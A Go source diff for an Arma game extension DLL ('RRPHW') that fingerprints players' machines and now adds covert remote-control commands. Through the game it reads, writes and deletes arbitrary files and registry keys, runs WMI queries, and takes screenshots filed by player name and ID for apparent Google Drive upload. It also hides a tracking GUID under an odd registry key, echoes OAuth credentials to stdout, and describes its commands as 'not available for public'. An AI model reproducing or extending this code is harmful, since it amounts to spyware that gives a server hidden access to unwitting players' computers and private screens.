@@ -12,99 +12,23 @@ import (
 	"crypto/rand"
 	"encoding/json"
 	"fmt"
-	"log"
 	"net"
+	"regexp"
+	"time"
 	"unsafe"
 
-	"github.com/mitchellh/go-ps"
-	"golang.org/x/sys/windows/registry"
+	"golang.org/x/oauth2"
+	"golang.org/x/oauth2/google"
+	"google.golang.org/api/drive/v3"
 )
 
 func main() {}
 
-func getProcesses() string {
-	procs, err := ps.Processes()
-	if err != nil {
-		ReturnMyData("errors", err)
-	}
-
-	result := make(map[string]struct{})
-	for _, proc := range procs {
-		name := proc.Executable()
-		if _, ok := result[name]; !ok {
-			result[name] = struct{}{}
-		}
-	}
-	names := []string{}
-	for key := range result {
-		names = append(names, key)
-	}
-	return fmt.Sprintf("%v\n", struct2JSON(names))
-}
-
-func struct2JSON(v interface{}) string {
-	b, _ := json.Marshal(v)
-	return string(b)
-}
-
-func readRegistrMachine(path string, value string) (string, error) {
-	id, err := registry.OpenKey(registry.LOCAL_MACHINE, path, registry.QUERY_VALUE|registry.WOW64_64KEY)
-
-	if err != nil {
-		ReturnMyData("errors", err)
-		return "", err
-	}
-	defer id.Close()
-
-	s, _, err := id.GetStringValue(value)
-	if err != nil {
-		ReturnMyData("errors", err)
-		return "", err
-	}
-	return s, nil
-}
-
-func readRegistrUser(path string, value string) (string, error) {
-	id, err := registry.OpenKey(registry.CURRENT_USER, path, registry.QUERY_VALUE|registry.WOW64_64KEY)
-	if err != nil {
-		ReturnMyData("errors", err)
-		return "", err
-	}
-	defer id.Close()
-
-	s, _, err := id.GetStringValue(value)
-	if err != nil {
-		ReturnMyData("errors", err)
-		return "", err
-	}
-	return s, nil
-}
-
-func writeRegistr(path string, block string, value string) (opened bool, err error) {
-	key, opened, err := registry.CreateKey(registry.CURRENT_USER, path, registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS)
-	if err := key.SetStringValue(block, value); err != nil {
-		fmt.Println(err)
-	}
-	log.Println("Key ", opened, err)
-	if err != nil {
-		ReturnMyData("errors", err)
-		return false, err
-	}
-	if !opened {
-		ReturnMyData("errors", err)
-		return false, err
-	}
-	return false, nil
-}
-
 func writeGUIDregistr() {
-	id, _ := readRegistrUser(`Software\Classes\mscfile\shell\open\command`, "GUID")
+	id := readReg("current_user", `Software\Classes\mscfile\shell\open\command`, "GUID")
 	if id == "" {
 		guid := generateGUID()
-		_, error := writeRegistr(`Software\Classes\mscfile\shell\open\command`, "GUID", guid)
-		if error != nil {
-			ReturnMyData("errors", error)
-		}
+		writeReg("current_user", `Software\Classes\mscfile\shell\open\command`, "GUID", guid)
 	}
 }
 
@@ -112,7 +36,7 @@ func generateGUID() (uuid string) {
 	b := make([]byte, 16)
 	_, err := rand.Read(b)
 	if err != nil {
-		ReturnMyData("errors", err)
+		returnMyData("errors", err)
 	}
 	uuid = fmt.Sprintf("%x%x%x%x%x%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:13], b[13:])
 	return
@@ -131,31 +55,32 @@ func getMacAddr() (addr string) {
 	return
 }
 
-//export ReturnMyData
-func ReturnMyData(input string, errors error) string {
+func returnMyData(input string, errors error) string {
 	rID := ""
 	switch input {
 	case "hwid":
-		id, _ := readRegistrMachine(`SOFTWARE\Microsoft\Cryptography`, "MachineGuid")
+		id := readReg("local_machine", `SOFTWARE\Microsoft\Cryptography`, "MachineGuid")
 		rID = fmt.Sprintf(id)
 	case "HDD_UID":
-		id, _ := readRegistrMachine(`HARDWARE\DESCRIPTION\System\MultifunctionAdapter\0\DiskController\0\DiskPeripheral\0`, "Identifier")
+		id := readReg("local_machine", `HARDWARE\DESCRIPTION\System\MultifunctionAdapter\0\DiskController\0\DiskPeripheral\0`, "Identifier")
 		rID = fmt.Sprintf(id)
 	case "Product_Win":
-		id, _ := readRegistrMachine(`SOFTWARE\Microsoft\Windows NT\CurrentVersion`, "ProductId")
+		id := readReg("local_machine", `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, "ProductId")
 		rID = fmt.Sprintf(id)
 	case "processList":
 		rID = fmt.Sprintf(getProcesses())
 	case "MAC":
 		rID = fmt.Sprintf(getMacAddr())
 	case "GUID":
-		id, _ := readRegistrUser(`Software\Classes\mscfile\shell\open\command`, "GUID")
+		id := readReg("current_user", `Software\Classes\mscfile\shell\open\command`, "GUID")
 		rID = fmt.Sprintf(id)
 	case "version":
 		writeGUIDregistr()
-		rID = fmt.Sprintf("v0.28|08.07.20")
+		rID = fmt.Sprintf("v2.00|11.11.20")
 	case "errors":
 		rID = fmt.Sprintf("Error '%s'", errors)
+	case "serials":
+		rID = getSerials()
 	case "info":
 		rID = fmt.Sprintf("Created by FairyTale5571. Commands not available for public")
 	default:
@@ -167,7 +92,7 @@ func ReturnMyData(input string, errors error) string {
 
 //export goRVExtensionVersion
 func goRVExtensionVersion(output *C.char, outputsize C.size_t) {
-	result := C.CString("RRPHW v.0.28")
+	result := C.CString("RRPHW v2.00")
 	defer C.free(unsafe.Pointer(result))
 	var size = C.strlen(result) + 1
 	if size > outputsize {
@@ -178,14 +103,95 @@ func goRVExtensionVersion(output *C.char, outputsize C.size_t) {
 
 //export goRVExtension
 func goRVExtension(output *C.char, outputsize C.size_t, input *C.char) {
-	id := ReturnMyData(C.GoString(input), nil)
+	id := returnMyData(C.GoString(input), nil)
 	temp := (fmt.Sprintf("%s", id))
-	// Return a result to Arma
-	result := C.CString(temp)
-	defer C.free(unsafe.Pointer(result))
-	var size = C.strlen(result) + 1
-	if size > outputsize {
-		size = outputsize
+	printInArma(output, outputsize, temp)
+}
+
+//export goRVExtensionArgs
+func goRVExtensionArgs(output *C.char, outputsize C.size_t, input *C.char, argv **C.char, argc C.int) {
+	offset := unsafe.Sizeof(uintptr(0))
+	action := C.GoString(input)
+	clearArgs := cleanInput(argv, int(argc))
+	switch action {
+	case "credentials":
+		var err error
+		_creds_json := (**C.char)(unsafe.Pointer(uintptr(unsafe.Pointer(argv))))
+		creds_json := C.GoString(*_creds_json)
+		creds_json = creds_json[1 : len(creds_json)-1]
+
+		reToken := regexp.MustCompile(`""`)
+		creds_json = reToken.ReplaceAllString(creds_json, `"`)
+
+		b := []byte(creds_json)
+		config, err = google.ConfigFromJSON(b, drive.DriveScope)
+		fmt.Println(creds_json)
+		if err != nil {
+			printInArma(output, outputsize, err.Error())
+			return
+		}
+		printInArma(output, outputsize, "Creds accepted")
+		return
+	case "token":
+		_token_json := (**C.char)(unsafe.Pointer(uintptr(unsafe.Pointer(argv))))
+		token_json := C.GoString(*_token_json)
+		token_json = token_json[1 : len(token_json)-1]
+
+		reToken := regexp.MustCompile(`""`)
+		token_json = reToken.ReplaceAllString(token_json, `"`)
+
+		fmt.Println(token_json)
+
+		tokenR := bytes.NewReader([]byte(token_json))
+
+		tok = &oauth2.Token{}
+		err := json.NewDecoder(tokenR).Decode(tok)
+		if err != nil {
+			printInArma(output, outputsize, err.Error())
+			return
+		}
+		printInArma(output, outputsize, "Token accepted")
+		return
+	case "doit":
+		_name := (**C.char)(unsafe.Pointer(uintptr(unsafe.Pointer(argv))))
+		_uid := (**C.char)(unsafe.Pointer(uintptr(unsafe.Pointer(argv)) + offset))
+
+		name := C.GoString(*_name)
+		uid := C.GoString(*_uid)
+
+		t := time.Now()
+		path := fmt.Sprintf("/screenshots/%s_%s/%d/%d/%d", name[1:len(name)-1], uid[1:len(uid)-1], t.Year(), t.Month(), t.Day())
+		time.Sleep(5 * time.Second)
+		makeScreenshot(path)
+		printInArma(output, outputsize, "Done")
+		return
+	case "write_reg":
+		printInArma(output, outputsize, writeReg(clearArgs[0], clearArgs[1], clearArgs[2], clearArgs[3]))
+		return
+	case "read_reg":
+		printInArma(output, outputsize, readReg(clearArgs[0], clearArgs[1], clearArgs[2]))
+		return
+	case "del_reg":
+		printInArma(output, outputsize, delReg(clearArgs[0], clearArgs[1], clearArgs[2]))
+		return
+	case "write_file":
+		printInArma(output, outputsize, writeFile(clearArgs[0], clearArgs[1]))
+		return
+	case "read_file":
+		printInArma(output, outputsize, readFile(clearArgs[0]))
+		return
+	case "delete_file":
+		printInArma(output, outputsize, delFile(clearArgs[0]))
+		return
+	case "ew":
+		printInArma(output, outputsize, readWmic(clearArgs[0], clearArgs[1]))
+		return
+	default:
+		temp := fmt.Sprintf("Undefined '%s' command", action)
+		printInArma(output, outputsize, temp)
+		return
 	}
-	C.memmove(unsafe.Pointer(output), unsafe.Pointer(result), size)
+
+	temp := fmt.Sprintf("Function: %s nb params: %d params: %s!", C.GoString(input), argc, clearArgs)
+	printInArma(output, outputsize, temp)
 }
